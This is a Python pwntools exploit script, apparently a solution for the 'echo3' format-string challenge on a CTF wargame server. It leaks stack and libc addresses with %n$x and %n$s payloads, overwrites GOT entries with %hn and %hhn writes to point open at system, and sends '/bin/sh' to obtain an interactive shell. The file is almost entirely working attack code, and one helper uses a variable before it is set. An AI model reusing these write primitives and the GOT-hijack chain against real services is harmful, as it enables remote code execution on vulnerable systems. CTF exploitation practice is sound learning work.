#!/usr/bin/python

import sys
from pwn import *

count = 1

def n(num): return '%{}$n'.format(num)
def hn(num): return '%{}$hn'.format(num)
def hhn(num): return '%{}$hhn'.format(num)

def pad(strr):
	global count
	count += 1
	return strr + "\x00"

def readx(num):
	global count
	if count >=6:
		num += 5*(count-5)
	payload = '%' + str(num) + '$08x7777'
	s.sendline(pad(payload))

	leak = s.recvuntil('7777')
	leak = int(leak[:8], 16)
	return leak

def readxx(num1, num2):
	global count
	if count >=6:
		num1 += 5*(count-5)
		num2 += 5*(count-5)
	payload = '%' + str(num1) + '$08x7777'
	payload += '%' + str(num2) + '$08x8888'
	s.sendline(pad(payload))

	leak1 = s.recvuntil('7777')
	leak1 = int(leak1[:8], 16)
    
	leak2 = s.recvuntil('8888')
	leak2 = int(leak2[:8], 16)

	return (leak1, leak2)

def readxx_plus(num1, num2):
	global count
	global sica7_o
	global sica8_o
	num1_wr = sica7_o
	num2_wr = sica8_o
	if count >=6:
		num1 += 5*(count-5)
		num2 += 5*(count-5)
		num3 += 5*(count-5)
		num1_wr += 5*(count-5)
		num2_wr += 5*(count-5)
	payload = mid_pad((addr_magic+52)&0xffff, 0) #2 bytes cuoi o dia chi $1
	payload += '%' + str(num1_wr) + '$hn'
	payload += mid_pad((addr_magic+60)&0xffff, (addr_magic+52)&0xffff)
	payload += '%' + str(num2_wr) + '$hn'	

	payload += '%' + str(num1) + '$08x7777'
	payload += '%' + str(num2) + '$08x8888'
	s.sendline(pad(payload))

	leak1 = s.recvuntil('7777')
	leak1 = int(leak1[-12:-4], 16)
	leak2 = s.recvuntil('8888')
	leak2 = int(leak2[-12:-4], 16)

	return (leak1, leak2)

def readxxx(num1, num2, num3):
	global count
	if count >=6:
		num1 += 5*(count-5)
		num2 += 5*(count-5)
		num3 += 5*(count-5)
	payload = '%' + str(num1) + '$08x7777'
	payload += '%' + str(num2) + '$08x8888'
	payload += '%' + str(num3) + '$08x9999'
	s.sendline(pad(payload))

	leak1 = s.recvuntil('7777')
	leak1 = int(leak1[:8], 16)
	leak2 = s.recvuntil('8888')
	leak2 = int(leak2[:8], 16)
	leak3 = s.recvuntil('9999')
	leak3 = int(leak3[:8], 16)

	return (leak1, leak2, leak3)

def reads(num):
	global count
	if count >=6:
		num += 5*(count-5)
	payload = '%' + str(num) + '$s' + '7777'
	s.sendline(pad(payload))
	leak = s.recvuntil('7777')
	leak = u32(leak[:4])
	return leak

def overwrite(num, value):
	global count
	if count >=6:
		num += 5*(count-5)
	payload = '%1$0' + str(value) + 'x'
	payload += '%' + str(num) + '$n7777' #14 + 5 + 5 = 24
	s.sendline(pad(payload))
	s.recvuntil('7777')

def overwrite2(num1, value1, num2, value2):
	global count
	if count >=6:
		num1 += 5*(count-5)
		num2 += 5*(count-5)
	payload = '%1$0' + str(value1) + 'x'
	payload += '%' + str(num1) + '$n'
	if value2 - value1 <= 8:
		payload += 'a'*(value2-value1)
	else:
		payload += '%1$0' + str(value2-value1) + 'x'
	payload += '%' + str(num2) + '$n7777'
	s.sendline(pad(payload))
	s.recvuntil('7777')
def to_off(addr):
	return (addr - addr_magic)/4 + 4

def sub(num1, num2):
	if num1 >= num2:
		return str(num1-num2)
	elif num1 < 0xff:
		return sub(num1+0x10000, num2)
	elif num1 < 0xffff:
		return sub(num1+0x10000, num2)
	else:
		print 'Error in sub()'
		sys.exit()

def mid_pad(num1, num2):
	if num1 - num2 <=8 and num1 - num2 >=0:
		return 'a'*(num1-num2)
	else:
		return '%1$0' + sub(num1, num2) + 'x'

def write_temp(addr, value):
	global sica7_o
	global sica8_o
	global sica7_x_o #$17
	global sica8_x_o #$19
	global my_exit_0_o
	global my_exit_2_o
	num1 = sica7_o
	num2 = sica8_o
	num3 = sica7_x_o
	num4 = sica8_x_o
	num5 = my_exit_0_o
	num6 = my_exit_2_o

	global count
	if count >=6:
		num1 += 5*(count-5)
		num2 += 5*(count-5)
		num3 += 5*(count-5)
		num4 += 5*(count-5)
		num5 += 5*(count-5)
		num6 += 5*(count-5)

	payload = mid_pad(0x20, 0) 
	payload += '%' + str(num3) + '$hhn'
	payload += mid_pad(0xa022, 0x20) 
	payload += '%' + str(num4) + '$hn'

	payload += '7777'

	s.sendline(pad(payload))
	s.recvuntil('7777') 

def write_real(low_byte_1, low_byte_2):
    global sica7_x_o #$17
    global sica8_x_o #$19
    num3 = sica7_x_o
    num4 = sica8_x_o

    global count
    if count >=6:
        num3 += 5*(count-5)
        num4 += 5*(count-5)

    payload = mid_pad(low_byte_1, 0)
    payload += '%' + str(num3) + '$hhn'
    payload += mid_pad(low_byte_2, low_byte_1)
    payload += '%' + str(num4) + '$hhn'

    payload += '7777'

    s.sendline(pad(payload))
    s.recvuntil('7777')
	
	
def write_real_2(high, low):
	num1 = 17 
	num2 = 19
	if count >= 6:
		num1 += 5*(count-5)
		num2 += 5*(count-5)
	if low < high:	
		payload = mid_pad(low, 0) #low
		payload += '%' + str(num1) + '$hn'
		payload += mid_pad(high, low) #high
		payload += '%' + str(num2) + '$hn'
		payload += '7777'
		s.sendline(pad(payload))
		print s.recvuntil('7777')
	else:
		payload = mid_pad(high, 0) #high_
		payload += '%' + str(num2) + '$hn'
		payload += mid_pad(low, high) #low
		payload += '%' + str(num1) + '$hn'
		payload += '7777'
		s.sendline(pad(payload))
		print s.recvuntil('7777')


exit_plt = 0x8048460
exit_got = 0x804a020
open_plt = 0x8048470
open_got = 0x804a024

printf_plt = 0x8048430
printf_got = 0x804a014
my_off_sys = 0x3d200
my_off_printf = 0x512d0
my_off_open = 0xe6730
off_sys = 0x3ad80
off_printf = 0x49590
off_open = 0xd57f0

config = '''
b *0x8048646
b *0x804864b
commands 1
x/32xw $esp
end
commands 2
x/32xw $esp
end
'''

#context.log_level = 'debug'
s = remote('hackme.inndy.tw', 7720)
#s = process('./echo3')
#gdb.attach(s, config)

#1 Read ebp & address of magic

ebp, addr_magic = readxx(18, 14)
print 'ebp: ' + hex(ebp)
print 'addr_magic: ' + hex(addr_magic)

#khong biet dat ten bien gi :v
sica_o = (ebp - addr_magic)/4 + 4
print 'sica_o: ' + str(sica_o)

#2 Read sica7_x, sica8_x
sica7_o = sica_o + 7
sica8_o = sica_o + 8
print 'sica7_o: ' + str(sica7_o)
print 'sica8_o: ' + str(sica8_o)

sica7_x, sica8_x= readxx(sica7_o, sica8_o)
low_sica7_x = '0x' + hex(sica7_x)[len(hex(sica7_x))-2:]
low_sica8_x = '0x' + hex(sica8_x)[len(hex(sica8_x))-2:]
sica7_x_o = to_off(sica7_x)
sica8_x_o = to_off(sica8_x)

print 'sica7_x: ' + hex(sica7_x)
print 'low_sica7_x: ' + low_sica7_x
print 'sica8_x: ' + hex(sica8_x)
print 'low_sica8_x: ' + low_sica8_x
low_sica7_x = int(low_sica7_x, 16)
low_sica8_x = int(low_sica8_x, 16)

print 'sica7_x_o: ' + str(sica7_x_o)
print 'sica8_x_o: ' + str(sica8_x_o)

#3 read sica7_x_x, sica8_x_x
sica7_x_x, sica8_x_x = readxx_plus(sica7_x_o, sica8_x_o)
low_sica7_x_x = int('0x' + hex(sica7_x_x)[len(hex(sica7_x_x))-2:], 16)
low_sica8_x_x = int('0x' + hex(sica8_x_x)[len(hex(sica8_x_x))-2:], 16)
sica7_x_x_o = to_off(sica7_x_x)
sica8_x_x_o = to_off(sica8_x_x)

print 'sica7_x_x: ' + hex(sica7_x_x)
print 'low_sica7_x_x: ' + hex(low_sica7_x_x)
print 'sica8_x_x: ' + hex(sica8_x_x)
print 'low_sica8_x_x: ' + hex(low_sica8_x_x)

print 'sica7_x_x_o: ' + str(sica7_x_x_o)
print 'sica8_x_x_o: ' + str(sica8_x_x_o)

my_exit_0 = sica7_x_x - low_sica7_x_x
my_exit_0_o = to_off(my_exit_0)
print 'my_exit_0: ' + hex(my_exit_0)
print 'my_exit_0_o: ' + str(my_exit_0_o)

my_exit_2 = my_exit_0 + 4
my_exit_2_o = to_off(my_exit_2)
print 'my_exit_2: ' + hex(my_exit_2)
print 'my_exit_2_o: ' + str(my_exit_2_o)

# Infinity loop
#4
write_temp(exit_got, 0x8048623)

#5
payload = mid_pad(0x804, 0) #high_addr_0
payload += '%' + str(19) + '$hn'
payload += mid_pad(0x8623, 0x804) #low_addr_0
payload += '%' + str(17) + '$hn' 
#payload = "%p "*30
payload += '7777'
s.sendline(pad(payload))
print s.recvuntil('7777')

#raw_input('[Stop 2: overwritten exit_got = 0x8048623 - Made infinity loop successfully!]')
#s.sendline('\x00'*500)
#s.interactive()

#---Made infinity loop successfully!---#













#6 overwrite $17 = open_got, $19 = open_got + 2
write_real(0x24, 0x26)

#raw_input('[Stop 3: overwritten $17=open_got, $19=open_got+2]')

#7 read address of open() -> address of system()

_open = reads(17)
print '_open: ' + hex(_open)
#raw_input("[Stop 4: read _open's address]")

#calculate system's address
system = _open + (off_sys - off_open)
system = hex(system)[2:]
print 'system: 0x' + system
system_0 = int(system[4:], 16)
system_2 = int(system[:4], 16)
system = int(system, 16)
print 'system_0: ' + hex(system_0)
print 'system_2: ' + hex(system_2)
#raw_input("[Stop 5: calculated system's address]")

#test %p
#payload = '%p '*30 + 'tttt'
#s.sendline(pad(payload))
#print s.recvuntil('tttt')
#raw_input('[Stop test]')

#8 overwrite open_got = system_plt
write_real_2(system_2, system_0)
#overwrite2(4, system_0, sica, system_2)
#raw_input('[Stop 6: overwritten open_got = system]')

#9 overwrite $17 = printf_got, $19 = printf_got+2
write_real(0x14, 0x16)
#raw_input('[Stop 7: overwritten 17 = printf_got, $19 = printf_got+2]')

#10 overwrite printf_got = open_plt
write_real_2(0x804, 0x8470)
#raw_input('[Stop 8: overwritten printf_got = open_plt]')

s.sendline('/bin/sh')
#raw_input('[Stop 9: sent /bin/sh]')
s.interactive()
s.close()
